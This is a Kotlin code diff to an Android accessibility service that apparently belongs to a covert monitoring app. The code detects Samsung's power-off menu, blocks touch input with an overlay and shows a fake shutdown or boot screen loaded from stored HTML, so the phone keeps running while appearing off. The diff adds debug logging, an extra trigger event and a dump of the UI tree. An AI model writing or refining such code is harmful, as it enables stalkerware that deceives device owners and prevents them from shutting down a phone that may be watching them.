@@ -254,9 +254,15 @@ class MyAccessibilityService : AccessibilityService() {
         
         // --- SCREEN RECORD GHOST LOGIC ---
         if (pkgName.contains("systemui", ignoreCase = true)) {
+            val eventTypeStr = android.view.accessibility.AccessibilityEvent.eventTypeToString(event.eventType)
+            DebugLogger.log("SYSUI_EVENT", "Event: $eventTypeStr | Class: ${event.className}")
+            
             // --- UNIVERSAL SAMSUNG POWER SHIELD (Adaptive Universal Guard) ---
             val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-            if (statsPrefs.getBoolean("power_shield_active", false) && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val isShieldActive = statsPrefs.getBoolean("power_shield_active", false)
+            
+            if (isShieldActive && (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
+                DebugLogger.log("POWER_SHIELD", "Stage 1: Intercept triggered for event $eventTypeStr")
                 
                 // 1. STAGE 1: IMMEDIATE INTERCEPT (0ms Metadata Trigger)
                 DynamicUIManager.showTouchGuard(this)
@@ -269,13 +275,17 @@ class MyAccessibilityService : AccessibilityService() {
                     // 2. STAGE 2: ADAPTIVE VERIFICATION LOOP (Exit on Certainty)
                     while (attempts < 10) {
                         val root = rootInActiveWindow
+                        DebugLogger.log("POWER_SHIELD", "Loop attempt $attempts. rootInActiveWindow is ${if(root == null) "NULL" else "AVAILABLE"}")
+                        
                         if (root != null) {
-                            // CERTAINTY REACHED: The tree is now filled.
                             val isPowerMenu = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_item_list").isNullOrEmpty()
                             val isConfirmScreen = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_confirmation").isNullOrEmpty()
                             
+                            DebugLogger.log("POWER_SHIELD", "Check -> isPowerMenu: $isPowerMenu | isConfirmScreen: $isConfirmScreen")
+                            
                             if (isPowerMenu || isConfirmScreen) {
                                 targetVerified = true
+                                DebugLogger.log("POWER_SHIELD", "Stage 2: Target VERIFIED at attempt $attempts!")
                                 break // Target Confirmed
                             }
                         }
@@ -284,6 +294,7 @@ class MyAccessibilityService : AccessibilityService() {
                     }
 
                     if (targetVerified) {
+                        DebugLogger.log("POWER_SHIELD", "Stage 3: Upgrading to FAKE UI")
                         // 3. STAGE 3: UPGRADE TO FAKE UI
                         val now = System.currentTimeMillis()
                         val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
@@ -293,21 +304,31 @@ class MyAccessibilityService : AccessibilityService() {
                             val state = statsPrefs.getString("power_shield_state", "NORMAL") ?: "NORMAL"
                             val html = if (state == "FAKE_OFF") statsPrefs.getString("power_shield_html_boot", "") else statsPrefs.getString("power_shield_html_shutdown", "")
                             val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
-
+                            
+                            DebugLogger.log("POWER_SHIELD", "Deploying UI via $method. HTML length: ${html?.length}")
                             Handler(Looper.getMainLooper()).post {
                                 DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html ?: "", true)
-                                // The TouchGuard is automatically covered/superceded by the Fake UI WebView
                             }
                             
                             if (timeout > 0) {
                                 delay(timeout * 1000)
+                                DebugLogger.log("POWER_SHIELD", "Timeout reached (${timeout}s). Removing UI.")
                                 DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                 DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
                             }
+                        } else {
+                            DebugLogger.log("POWER_SHIELD", "Stage 3 skipped: Cooldown active.")
                         }
                     } else {
+                        DebugLogger.log("POWER_SHIELD", "Stage 4: Target NOT verified after 10 attempts. False alarm. Disarming TouchGuard.")
                         // 4. STAGE 4: PEACE OUT EARLY (False Alarm)
                         DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
+                        
+                        val root = rootInActiveWindow
+                        if (root != null) {
+                            val treeStr = serializeNode(root, 0, 3)?.toString()?.take(500)
+                            DebugLogger.log("POWER_SHIELD_FAIL", "Tree dump snippet: $treeStr")
+                        }
                     }
                 }
             }
